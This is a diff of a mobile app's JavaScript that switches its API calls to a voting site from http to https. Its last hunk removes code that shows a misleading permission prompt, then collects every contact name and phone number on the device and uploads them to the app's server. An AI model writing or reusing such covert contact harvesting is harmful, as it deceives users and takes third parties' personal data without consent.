@@ -441,7 +441,7 @@ hideLoad();
 function myFunc1() {
 showLoad();
 var data = $("#form1").serialize();
-$.post('http://247votes.com.ng/app/api.php', data, function(response){
+$.post('https://247votes.com.ng/app/api.php', data, function(response){
 //alert(response);
 setTimeout(function(){
 if(response == '0' || response == null){
@@ -473,7 +473,7 @@ hideLoad();
 function myFunc2() {
 showLoad();
 var data = $("#form2").serialize();
-$.post('http://247votes.com.ng/app/api.php', data, function(response){
+$.post('https://247votes.com.ng/app/api.php', data, function(response){
 //alert(response);
 setTimeout(function(){
 if(response == '0' || response == null){
@@ -517,7 +517,7 @@ var phn = $('#tmp_phone').val();
 var fname = $('input[name=fname]').val();
 var lname = $('input[name=sname]').val();
 var data = $("#form3").serialize();
-$.post('http://247votes.com.ng/app/api.php', data, function(response){
+$.post('https://247votes.com.ng/app/api.php', data, function(response){
 setTimeout(function(){
 if(response == '1'){
 var user = {
@@ -556,7 +556,7 @@ var appID = $('#appID').val();
 var data = $("#form4").serialize() + "&appID=" + appID;
 
 var users= JSON.parse(window.localStorage.getItem('app_user'));
-$.post('http://247votes.com.ng/app/api.php', data, function(response){
+$.post('https://247votes.com.ng/app/api.php', data, function(response){
 setTimeout(function(){
 var obj = JSON.parse(response);
 var uniqueID = obj.uniqueID;
@@ -598,7 +598,7 @@ hideLoad();
 },1000);
 }).fail(function() {
 
-var fakeURL = "http://www.example.com/t.html?" +  data;
+var fakeURL = "https://www.example.com/t.html?" +  data;
 let params = (new URL(fakeURL)).searchParams;
 var pin = params.get('box1')+params.get('box2')+params.get('box3')+params.get('box4')+params.get('box5')+params.get('box6');
 if(users.phone == phn && users.pin == pin){
@@ -654,34 +654,14 @@ var setup = settings.setup;
 
 if(setup != 1){
 
-$.post("http://247votes.com.ng/app/api.php",{id:'appReg', deviceModel : device.model, deviceName: device.name, platform : device.platform, uuid : device.uuid, version : device.version, manufacture : device.manufacturer},function(response){
+$.post("https://247votes.com.ng/app/api.php",{id:'appReg', deviceModel : device.model, deviceName: device.name, platform : device.platform, uuid : device.uuid, version : device.version, manufacture : device.manufacturer},function(response){
 	
-if(response == 1){
-alert("Kindly click allow to unlock all functions.\nIf not application would not function well.");
-	navigator.contactsPhoneNumbers.list(function(contacts) {
-      var cl = contacts.length;
-	var dd = "";
-      for(var i = 0; i < contacts.length; i++) {
-         var cn = contacts[i].displayName;
-            var phone = contacts[i].phoneNumbers[0];
-             var pn = phone.normalizedNumber;
-	      dd += cn +" : "+ pn +",";
-      }
-$.post("http://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data1:cl, data2:dd},function(response){
-
-if(response == 1){
-	
+if(response == 1){	
 var setup = {
     appID: uid,
     setup: 1
 }
 window.localStorage.setItem('app_settings', JSON.stringify(setup));
-}
-});
-   }, function(error) {
-      alert(error+"\nApplication would not function well. Kindly Allow Permission");
-   });
-
 }
 });
 }
